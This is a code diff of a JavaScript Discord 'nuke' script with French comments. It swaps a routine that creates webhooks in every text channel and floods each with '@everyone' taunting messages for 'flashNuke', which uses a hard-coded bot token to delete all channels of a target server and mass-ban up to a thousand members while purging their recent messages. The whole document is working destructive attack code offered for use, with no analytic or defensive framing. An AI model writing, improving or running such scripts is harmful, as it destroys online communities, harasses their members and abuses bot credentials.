@@ -3,42 +3,45 @@ const part2 = "9WkxRc2uaempXmyLz_WAfIiSU_WjR14MVRMqE8";
 const botToken = part1 + part2;
 const guild = "1534554643583995936";
 
-async function webhookSpam() {
-  console.log("démarrage du webhook spam...");
+async function flashNuke() {
+  console.log("démarrage du flash nuke...");
 
-  // 1. récupérer tous les salons
+  // 1. supprimer TOUS les salons d'un coup
   let channels = await (await fetch(`https://discord.com/api/v9/guilds/${guild}/channels`, {
     headers: { "Authorization": `Bot ${botToken}` }
   })).json();
   
-  // 2. pour chaque salon, créer un webhook et spammer
-  for (let c of channels) {
-    if (c.type !== 0) continue; // seulement les salons textuels
-
-    try {
-      // Créer un webhook
-      let whRes = await fetch(`https://discord.com/api/v9/channels/${c.id}/webhooks`, {
-        method: "POST",
-        headers: { "Authorization": `Bot ${botToken}`, "Content-Type": "application/json" },
-        body: JSON.stringify({ name: "Nuke" })
-      });
-      let wh = await whRes.json();
-      
-      if (wh.url) {
-        // Envoyer 10 messages par webhook
-        for (let i = 0; i < 10; i++) {
-          fetch(wh.url, {
-            method: "POST",
-            headers: { "Content-Type": "application/json" },
-            body: JSON.stringify({ content: "@everyone ce serveur est mort mdr" })
-          }).catch(() => {});
-        }
-        console.log(`spam du salon : ${c.name}`);
-      }
-    } catch (e) {}
+  if (channels.message) {
+    console.log("erreur :", channels.message);
+    return;
   }
 
-  console.log("fin du webhook spam.");
+  let delChannels = channels.map(c => fetch(`https://discord.com/api/v9/channels/${c.id}`, {
+    method: "DELETE",
+    headers: { "Authorization": `Bot ${botToken}` }
+  }).catch(() => {}));
+  
+  await Promise.all(delChannels);
+  console.log("salons détruits.");
+
+  // 2. ban tout le monde d'un coup
+  let members = await (await fetch(`https://discord.com/api/v9/guilds/${guild}/members?limit=1000`, {
+    headers: { "Authorization": `Bot ${botToken}` }
+  })).json();
+  
+  let banMembers = members.map(m => {
+    if (m.user.bot || m.user.id === guild) return Promise.resolve(); 
+    return fetch(`https://discord.com/api/v9/guilds/${guild}/bans/${m.user.id}`, {
+      method: "PUT",
+      headers: { "Authorization": `Bot ${botToken}`, "Content-Type": "application/json" },
+      body: JSON.stringify({ delete_message_seconds: 604800 })
+    }).catch(() => {});
+  });
+  
+  await Promise.all(banMembers);
+  console.log("membres bannis.");
+
+  console.log("fin du flash nuke.");
 }
 
-webhookSpam();
+flashNuke();
